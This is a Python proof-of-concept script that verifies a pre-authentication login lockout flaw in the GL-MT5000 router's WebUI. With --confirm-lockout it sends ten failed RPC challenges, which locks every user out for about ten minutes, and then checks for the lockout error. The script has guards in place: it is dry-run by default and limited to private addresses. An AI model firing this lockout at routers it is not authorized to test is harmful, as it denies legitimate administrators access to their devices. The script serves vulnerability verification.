#!/usr/bin/env python3
"""Guarded verifier for the GL-MT5000 global pre-auth login lockout.

Use only against a router you own or are authorized to test. The destructive
mode intentionally prevents WebUI logins for about ten minutes.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import sys
import urllib.error
import urllib.request
from urllib.parse import urlparse


def rpc(url: str, method: str, params: dict, timeout: float) -> dict:
    body = json.dumps(
        {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    ).encode()
    request = urllib.request.Request(
        url.rstrip("/") + "/rpc",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return json.loads(response.read())


def private_target(url: str) -> bool:
    host = urlparse(url).hostname
    if not host:
        return False
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        return host in {"localhost", "console.gl-inet.com"}
    return address.is_private or address.is_loopback or address.is_link_local


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://192.168.8.1")
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument(
        "--confirm-lockout",
        action="store_true",
        help="Send ten failures, intentionally locking all WebUI users out.",
    )
    args = parser.parse_args()

    if not private_target(args.url):
        parser.error("target must be a literal private/local address")

    if not args.confirm_lockout:
        print(
            "Dry run only. This verifier would send ten invalid challenges and "
            "then one observation request. Re-run with --confirm-lockout only "
            "on an authorized disposable test device."
        )
        return 0

    try:
        for attempt in range(1, 11):
            response = rpc(
                args.url,
                "challenge",
                {"username": "friday_nonexistent_user"},
                args.timeout,
            )
            print(f"failure {attempt}: {json.dumps(response, sort_keys=True)}")

        observed = rpc(
            args.url, "challenge", {"username": "root"}, args.timeout
        )
        print("root challenge after failures:", json.dumps(observed, sort_keys=True))
    except (OSError, urllib.error.URLError, json.JSONDecodeError) as exc:
        print(f"probe failed: {exc}", file=sys.stderr)
        return 2

    error = observed.get("error") or {}
    data = error.get("data") or {}
    if error.get("code") == -32003 and data.get("wait", 0) > 0:
        print("CONFIRMED: global WebUI login lockout is active.")
        return 0

    print("NOT CONFIRMED: expected error -32003 with a positive wait value.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
